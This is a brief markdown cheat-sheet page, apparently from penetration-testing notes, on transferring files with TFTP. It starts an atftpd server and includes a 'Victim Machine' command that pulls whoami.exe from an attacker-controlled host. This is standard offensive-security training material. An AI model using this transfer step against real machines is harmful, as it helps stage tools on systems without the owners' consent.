# TFTP

```
Description:  like FTP, but simpler and less secure uses UDP port 69

--daemon                runs in background
--port 69               standard TFTP port
/var/tftp               directory to serve files from

# Start a TFTP Server (on your machine):
sudo atftpd --daemon --port 69 /var/tftp
```

# Victim Machine
```
# Victim Machine Downloads File
tftp -i 192.168.0.1 GET whoami.exe
```

## Back to README.md
[BACK](../README.md)